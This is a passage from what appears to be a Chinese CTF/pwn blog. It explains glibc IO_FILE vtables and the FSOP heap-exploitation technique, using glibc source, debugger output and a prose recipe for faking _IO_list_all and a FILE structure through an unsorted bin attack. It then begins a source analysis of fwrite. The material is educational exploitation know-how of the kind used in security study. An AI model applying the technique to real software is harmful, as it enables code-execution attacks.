class="number">0x7ffff7dd1660</span>,</span><br><span class="line">    _freeres_list = <span class="number">0x0</span>,</span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>,</span><br><span class="line">    __pad5 = <span class="number">0x0</span>,</span><br><span class="line">    _mode = <span class="number">0x0</span>,</span><br><span class="line">    _unused2 = &#123;<span class="number">0x0</span> &lt;repeats <span class="number">20</span> times&gt;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = <span class="number">0x7ffff7dd06e0</span> <span class="comment">// target</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p*(struct _IO_jump_t*)_IO_list_all.vtable <span class="comment">// vtable的所有字段都可以劫持</span></span><br><span class="line">$<span class="number">6</span> = &#123;</span><br><span class="line">  __dummy = <span class="number">0</span>,</span><br><span class="line">  __dummy2 = <span class="number">0</span>,</span><br><span class="line">  __finish = <span class="number">0x7ffff7a869d0</span> &lt;_IO_new_file_finish&gt;,</span><br><span class="line">  __overflow = <span class="number">0x7ffff7a87740</span> &lt;_IO_new_file_overflow&gt;,</span><br><span class="line">  __underflow = <span class="number">0x7ffff7a874b0</span> &lt;_IO_new_file_underflow&gt;,</span><br><span class="line">  __uflow = <span class="number">0x7ffff7a88610</span> &lt;__GI__IO_default_uflow&gt;,</span><br><span class="line">  __pbackfail = <span class="number">0x7ffff7a89990</span> &lt;__GI__IO_default_pbackfail&gt;,</span><br><span class="line">  __xsputn = <span class="number">0x7ffff7a861f0</span> &lt;_IO_new_file_xsputn&gt;,</span><br><span class="line">  __xsgetn = <span class="number">0x7ffff7a85ed0</span> &lt;__GI__IO_file_xsgetn&gt;,</span><br><span class="line">  __seekoff = <span class="number">0x7ffff7a854d0</span> &lt;_IO_new_file_seekoff&gt;,</span><br><span class="line">  __seekpos = <span class="number">0x7ffff7a88a10</span> &lt;_IO_default_seekpos&gt;,</span><br><span class="line">  __setbuf = <span class="number">0x7ffff7a85440</span> &lt;_IO_new_file_setbuf&gt;,</span><br><span class="line">  __sync = <span class="number">0x7ffff7a85380</span> &lt;_IO_new_file_sync&gt;,</span><br><span class="line">  __doallocate = <span class="number">0x7ffff7a7a190</span> &lt;__GI__IO_file_doallocate&gt;,</span><br><span class="line">  __read = <span class="number">0x7ffff7a861b0</span> &lt;__GI__IO_file_read&gt;,</span><br><span class="line">  __write = <span class="number">0x7ffff7a85b80</span> &lt;_IO_new_file_write&gt;,</span><br><span class="line">  __seek = <span class="number">0x7ffff7a85980</span> &lt;__GI__IO_file_seek&gt;,</span><br><span class="line">  __close = <span class="number">0x7ffff7a85350</span> &lt;__GI__IO_file_close&gt;,</span><br><span class="line">  __stat = <span class="number">0x7ffff7a85b70</span> &lt;__GI__IO_file_stat&gt;,</span><br><span class="line">  __showmanyc = <span class="number">0x7ffff7a89b00</span> &lt;_IO_default_showmanyc&gt;,</span><br><span class="line">  __imbue = <span class="number">0x7ffff7a89b10</span> &lt;_IO_default_imbue&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面是 raycp 大佬对 vtable 调用的总结</p>
<p>fread 函数中调用的 vtable 函数有：</p>
<ul>
<li><code>_IO_sgetn</code>函数调用了vtable的<code>_IO_file_xsget</code></li>
<li><code>_IO_doallocbuf</code>函数调用了vtable的<code>_IO_file_doallocate</code>以初始化输入缓冲区</li>
<li>vtable中的<code>_IO_file_doallocate</code>调用了vtable中的<code>__GI__IO_file_stat</code>以获取文件信息</li>
<li><code>__underflow</code>函数调用了vtable中的<code>_IO_new_file_underflow</code>实现文件数据读取</li>
<li>vtable中的<code>_IO_new_file_underflow</code>调用了vtable<code>__GI__IO_file_read</code>最终去执行系统调用read</li>
</ul>
<p>fwrite 函数调用的 vtable 函数有：</p>
<ul>
<li><code>_IO_fwrite</code>函数调用了vtable的<code>_IO_new_file_xsputn</code></li>
<li><code>_IO_new_file_xsputn</code>函数调用了vtable中的<code>_IO_new_file_overflow</code>实现缓冲区的建立以及刷新缓冲区</li>
<li>vtable中的<code>_IO_new_file_overflow</code>函数调用了vtable的<code>_IO_file_doallocate</code>以初始化输入缓冲区</li>
<li>vtable中的<code>_IO_file_doallocate</code>调用了vtable中的<code>__GI__IO_file_stat</code>以获取文件信息</li>
<li><code>new_do_write</code>中的<code>_IO_SYSWRITE</code>调用了vtable<code>_IO_new_file_write</code>最终去执行系统调用write</li>
</ul>
<p>fclose 函数调用的 vtable 函数有：</p>
<ul>
<li>在清空缓冲区的<code>_IO_do_write</code>函数中会调用vtable中的函数</li>
<li>关闭文件描述符<code>_IO_SYSCLOSE</code>函数为vtable中的<code>__close</code>函数</li>
<li><code>_IO_FINISH</code>函数为vtable中的<code>__finish</code>函数</li>
</ul>
<p><strong>FSOP</strong></p>
<p>终于到今天的主角了，FSOP全称是 <code>File Stream Oriented Programming</code> ，它的核心就在于伪造  <code>_IO_list_all</code> 指针（ <code>_IO_list_all</code> 永远指向当前FILE结构体链的第一个元素）</p>
<ul>
<li>这个技术的核心就是劫持 <code>_IO_list_all</code> 的值来伪造链表和其中的 <code>_IO_FILE</code> 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发</li>
<li>FSOP 选择的触发方法是调用 <code>_IO_flush_all_lockp</code>，这个函数会刷新 <code>_IO_list_all</code> 链表中所有项的文件流（相当于对每个FILE调用 fflush），也对应着会调用 <code>_IO_FILE_plus.vtable</code> 中的 <code>IO_overflow</code> 函数</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">  FILE *fp;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">        _IO_flockfile (fp);</span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<span class="comment">/*一些检查，需要绕过*/</span></span><br><span class="line">           || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">               &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<span class="comment">/*也可以绕过这个*/</span></span><br><span class="line">           )</span><br><span class="line">          &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<span class="comment">/*遍历_IO_list_all ，选出_IO_FILE作为_IO_OVERFLOW的参数，执行函数*/</span></span><br><span class="line">        result = EOF;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">        _IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>IO_flush_all_lockp</code> 函数触发条件：</p>
<ul>
<li>当 libc 执行 abort 流程时，abort 可以通过触发 malloc_printerr 来触发</li>
<li>当执行 exit 函数时</li>
<li>当执行流从 main 函数返回时</li>
</ul>
<p>FSOP 攻击的前提条件：</p>
<ul>
<li>泄露出 libc 地址，知道 <code>_IO_lsit_all</code> 的地址</li>
<li>任意地址写的能力，修改 <code>_IO_list_all</code> 为可控的地址</li>
<li>可以在可控内存中伪造 <code>_IO_FILE_plus</code> 结构</li>
</ul>
<p>伪造的 <code>_IO_FILE_plus</code> 结构体要绕过的 check：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">或者是</span><br><span class="line"><span class="number">2.</span>_IO_vtable_offset (fp) == <span class="number">0</span> &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br></pre></td></tr></table></figure>
<p><strong>FSOP 利用姿势</strong></p>
<p>在考虑进行 FSOP 攻击时，常常不会有可控的 WAA，这时我们利用 unsortedbin attack 在 <code>_IO_list_all</code> 中写入 main_arena + 88 的地址，那么程序就会把 main_arena + 88 当做FILE结构体</p>
<p>然后 main_arena + 0xc0(88+0x68) 的位置就是FILE结构体的 <code>_chain</code> 条目，同时，main_arena + 0xc0 也会指向对应大小为“0x60”的 smallbin，那么大小为“0x60”的smallbin就会被程序当成下一个FILE结构体</p>
<p>到了这里通常有两种应对方式，一是直接申请大小为“0x60”的chunk，把它放入对应 smallbin 的头部，然后在其内部进行伪造，二是通过堆溢出等方式，修改 unsortedbin 的size为“0x61”（注意规避合并机制），再次申请 chunk，该 unsortedbin 就会被放入 smallbin</p>
<p>接下来就是对 FILE 结构体的伪造，只需要伪造 vtable 的指向地址，然后再该地址处写入 fake vtable 就可以了</p>
<p>而在对 vtable 的伪造中，主要是伪造 <code>_IO_OVERFLOW</code> 条目（第4个），因为程序对FILE结构的破坏，导致程序会触发报错提示，根据程序调用链发现中途会调用 <code>_IO_OVERFLOW</code> ，正好可以被控制</p>
<p>这就是 FSOP 的全过程了，可以去学习 house of orange 进行巩固</p>
<hr>
<p>文字描述有点多，需要根据题目过一遍</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/01/IO_FILE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9Afwrite/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/01/IO_FILE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9Afwrite/" class="post-title-link" itemprop="url">IO_FILE源码分析：fwrite</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-04-01 00:00:36 / Modified: 00:01:30" itemprop="dateCreated datePublished" datetime="2022-04-01T00:00:36+08:00">2022-04-01</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SourceCodeAnalysis/" itemprop="url" rel="index"><span itemprop="name">SourceCodeAnalysis</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>8.5k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>8 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="IO-FILE源码分析：fwrite"><a href="#IO-FILE源码分析：fwrite" class="headerlink" title="IO_FILE源码分析：fwrite"></a>IO_FILE源码分析：fwrite</h2><p>直接上源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_fwrite (buf, size, count, fp)</span><br><span class="line">     <span class="keyword">const</span> <span class="keyword">void</span> *buf;</span><br><span class="line">     _IO_size_t size;</span><br><span class="line">     _IO_size_t count;</span><br><span class="line">     _IO_FILE *fp;</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t request = size * count;</span><br><span class="line">  _IO_size_t written = <span class="number">0</span>;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (request == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_cleanup_region_start ((<span class="keyword">void</span> (*) __P ((<span class="keyword">void</span> *))) _IO_funlockfile, fp);</span><br><span class="line">  _IO_flockfile (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_vtable_offset != <span class="number">0</span> || _IO_fwide (fp, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">    written = _IO_sputn (fp, (<span class="keyword">const</span> <span class="keyword">char</span> *) buf, request); <span class="comment">/* vtable-&gt;__xsputn */</span></span><br><span class="line">  _IO_funlockfile (fp);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (written == request)</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> written / size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里重点关注一下 _IO_sputn 函数（vtable-&gt;__xsputn），其他的东西都不用管</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> _IO_new_file_xsputn _IO_file_xsputn</span></span><br><span class="line"></span><br><span class="line">_IO_size_t</span><br><span class="line">_IO_new_file_xsputn (f, data, n) <span class="comment">/* n==request */</span></span><br><span class="line">     _IO_FILE *f;</span><br><span class="line">     <span class="keyword">const</span> <span class="keyword">void</span> *data;</span><br><span class="line">     _IO_size_t n;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">register</span> <span class="keyword">const</span> <span class="keyword">char</span> *s = (<span class="keyword">const</span> <span class="keyword">char</span> *) data;</span><br><span class="line">  _IO_size_t to_do = n;</span><br><span class="line">  <span class="keyword">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>) </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line">  count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* 判断输出缓冲区还有多少空间 */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr; <span class="comment">/* 判断输出缓冲区还有多少空间 */</span></span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n) <span class="comment">/* 输出缓冲区够用 */</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">register</span> <span class="keyword">const</span> <span class="keyword">char</span> *p;</span><br><span class="line">	  <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		  count = p - s + <span class="number">1</span>; <span class="comment">/* 重新调整输出缓冲区的可用size */</span></span><br><span class="line">		  must_flush = <span class="number">1</span>;</span><br><span class="line">		  <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>) <span class="comment">/* 如果输出缓冲区有空间，则先把数据拷贝至输出缓冲区 */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">	count = to_do;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">	&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC</span></span><br><span class="line">	  f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	  <span class="built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count); <span class="comment">/* 将目标输出数据拷贝至输出缓冲区 */</span></span><br><span class="line">	  f-&gt;_IO_write_ptr += count;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	  s += count; <span class="comment">/* 计算是否还有目标输出数据剩余 */</span></span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">register</span> <span class="keyword">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">	  <span class="keyword">register</span> <span class="keyword">int</span> i = (<span class="keyword">int</span>) count;</span><br><span class="line">	  <span class="keyword">while</span> (--i &gt;= <span class="number">0</span>)</span><br><span class="line">	    *p++ = *s++;</span><br><span class="line">	  f-&gt;_IO_write_ptr = p;</span><br><span class="line">	&#125;</span><br><span class="line">      to_do -= count; <span class="comment">/* 计算是否还有目标输出数据剩余 */</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>) </span><br><span class="line">      <span class="comment">/* 如果还有目标数据剩余，此时则表明输出缓冲区未建立或输出缓冲区已经满了 */</span></span><br><span class="line">    &#123;</span><br><span class="line">      _IO_size_t block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line">	<span class="keyword">return</span> n - to_do;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.</span></span><br><span class="line"><span class="comment">	 dont_write is what gets left over. */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base; <span class="comment">/* 检查输出数据是否是大块 */</span></span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">        &#123;</span><br><span class="line">	  count = new_do_write (f, s, do_write);</span><br><span class="line">	  to_do -= count;</span><br><span class="line">	  <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">	    <span class="keyword">return</span> n - to_do;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment">	 buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment">	 so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">	to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>fwrite</code> 的主要实现在 <code>_IO_new_file_xsputn</code> 中，整体流程包含四个部分：</p>
<ul>
<li>首先判断输出缓冲区还有多少剩余，如果有剩余则将目标输出数据拷贝至输出缓冲区（能拷贝多少就拷贝多少）</li>
<li>如果输出缓冲区没有剩余（输出缓冲区未建立也是没有剩余）或输出缓冲区不够则调用 <code>_IO_OVERFLOW</code> 建立输出缓冲区或刷新输出缓冲区</li>
<li>输出缓冲区刷新后判断剩余的目标输出数据是否超过块的size，如果超过块的size，则不通过输出缓冲区直接以块为单位，使用 <code>new_do_write</code> 输出目标数据</li>
<li>如果按块输出数据后还剩下一点数据则调用 <code>_IO_default_xsputn</code> 将数据拷贝至输出缓冲</li>
</ul>
<p>接下来就分析这些过程：（第一部分在注释中已经解释了，略过）</p>
<p><strong>建立输出缓冲区或刷新输出缓冲区</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>) </span><br><span class="line">     <span class="comment">/* 如果还有目标数据剩余，此时则表明输出缓冲区未建立或输出缓冲区已经满了 */</span></span><br><span class="line">   &#123;</span><br><span class="line">     _IO_size_t block_size, do_write;</span><br><span class="line">     <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line"><span class="keyword">return</span> n - to_do;</span><br><span class="line">     ......</span><br></pre></td></tr></table></figure>
<p>追踪进入 _IO_OVERFLOW ：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br></pre></td></tr></table></figure>
<p>可以发现 <code>_IO_OVERFLOW</code> 的调用是虚表调用（可以进行劫持或伪造，FSOP惯用手段），其指向内容为 <code>_IO_new_file_overflow</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> _IO_new_file_overflow _IO_file_overflow</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_overflow (f, ch)</span><br><span class="line">      _IO_FILE *f;</span><br><span class="line">      <span class="keyword">int</span> ch;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) </span><br><span class="line">      <span class="comment">/* 检测IO_FILE的_flags是否包含_IO_NO_WRITES标志位 */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="number">0</span>) <span class="comment">/* 表明输出缓冲区尚未建立 */</span></span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_doallocbuf (f); <span class="comment">/* 调用_IO_doallocbuf函数去分配输出缓冲区 */</span></span><br><span class="line">	  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">	 logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">	 read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">	 makes room for subsequent output.</span></span><br><span class="line"><span class="comment">	 Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">	 alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end) <span class="comment">/* 初始化其他指针 */</span></span><br><span class="line">	f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = 